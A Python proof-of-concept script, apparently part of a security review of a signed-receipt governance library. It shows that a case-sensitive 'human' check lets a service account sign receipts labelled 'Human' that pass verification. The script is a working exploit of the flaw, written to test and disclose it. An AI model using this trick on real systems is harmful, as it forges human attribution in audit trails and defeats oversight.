#!/usr/bin/env python3
"""PoC 4 — S2.8: CASE-VARIANT actor.type evades the L3 human-principal law.

verify_receipt checks `actor.get("type") == "human"` — case-sensitively.
A service account (which holds its own signing key) mints a receipt with
actor.type = "Human" (title case), auth_method = "api_key", no
human_principal. The L3 check never fires; the receipt PASSES while any
case-insensitive downstream consumer (or human reader) sees a HUMAN actor.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

def sign_statement(sk, predicate, subject_name="prod:svc"):
    """Exactly what build_receipt does, minus its L3 assertions — i.e. what a
    service account with its own key can produce with a 5-line signer."""
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": subject_name,
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

sk, pk = generate_keypair()
predicate = {
    "action_id": "deploy-913",
    "actor": {"type": "Human",                # <-- capital H: L3 never fires
              "id": "agent://deploy-bot",
              "is_service_account": True,      # openly a service account
              "auth_method": "api_key"},       # authenticating by api_key
    "policy_decision": {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")},
    "execution": {"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"},
    "evidence": {"items": EV, "completeness": "COMPLETE", "redaction_commitments": []},
    "timestamps": {"created": "2026-08-30T00:00:00+00:00",
                   "executed": "2026-08-30T00:00:00+00:00", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
}
receipt = sign_statement(sk, predicate)
v = verify_receipt(receipt, pk)
print("verdict:", v.verdict, "| signature_valid:", v.signature_valid)
print("reasons:", v.reasons)
print("actor as seen by auditor:", receipt["predicate"]["actor"])

# Unexpected PASS: receipt presents a human-typed actor with api_key auth and
# no human_principal, yet the verifier's L3 law is not enforced.
if v.verdict == "PASS":
    print("EXPLOIT-WORKS")
else:
    print("HELD")
